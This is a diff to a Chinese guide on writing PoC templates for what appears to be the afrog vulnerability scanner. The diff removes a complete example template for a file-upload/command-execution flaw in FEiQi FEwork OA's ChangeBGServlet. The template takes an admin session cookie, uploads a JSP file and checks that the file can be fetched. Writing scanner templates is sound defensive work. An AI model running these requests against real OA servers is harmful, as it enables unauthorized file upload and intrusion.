@@ -88,66 +88,11 @@ POC编写函数文档:
 
 ![image-20251205225309476](/assets/image-20251205225309476.png)
 
-```
-id: poc-feiqi-changebgservlet
+## Brute 字典枚举（规则级）
 
-info:
-  name: poc-feiqi-ChangeBGServlet
-  author: moda
-  severity: high
-  description: |
-    飞企互联OA FEwork ChangeBGServlet 命令执行漏洞(QVD-2025-25776)
-    
-    FOFA：app="FE-协作平台"
-  reference:
-    - https://example.com
-  tags: 飞企互联OA, rec
+[Brute PoC 编写规则](https://github.com/zan8in/afrog/wiki/Afrog-PoC-%E8%A7%84%E5%88%99%E7%BC%96%E5%86%99%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97#brute-%E5%AD%97%E5%85%B8%E6%9E%9A%E4%B8%BE%E8%A7%84%E5%88%99%E7%BA%A7)
 
-set:
-  rand_str: randomLowercase(30)
-
-rules:
-  r0:
-    request:
-      method: POST
-      path: /mobileKey
-      headers:
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) Chrome/88.0.772.137 Safari/537.36
-        Content-Type: application/x-www-form-urlencoded
-      body: userName=admin
-    output:
-      SCookie: '"Set-Cookie: (?P<SCookie>.+) Path=".bsubmatch(response.raw_header)'
-    expression: response.status == 200 && response.body.bcontains(b"true")
-  r1:
-    request:
-      method: POST
-      path: /servlet/ChangeBGServlet
-      headers:
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
-        Cookie: "{{SCookie['SCookie']}}"
-        Connection: close
-        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk
-      body: |
-        ------WebKitFormBoundaryKNt0t4vBe8cX9rZk
-        Content-Disposition: form-data; name="file"; filename="test.jsp"
-        Content-Type: text/plain
-        
-        {{rand_str}}
-        ------WebKitFormBoundaryKNt0t4vBe8cX9rZk--
-    output:
-      Paths: '"\"saveName\":\"(?P<Paths>.+)\",".bsubmatch(response.body)'
-    expression: response.status == 200
-  r2:
-    request:
-      method: GET
-      path: /login/applyTheme/images/porttal/login/{{Paths['Paths']}}
-      headers:
-        Cookie: "{{SCookie['SCookie']}}"
-    expression: response.status == 200 && response.body.bcontains(bytes(rand_str))
-
-expression: r0() && r1() && r2()
-
-```
+![image-20260104135223690](.\assets\image-20260104135223690.png)
 
 
 
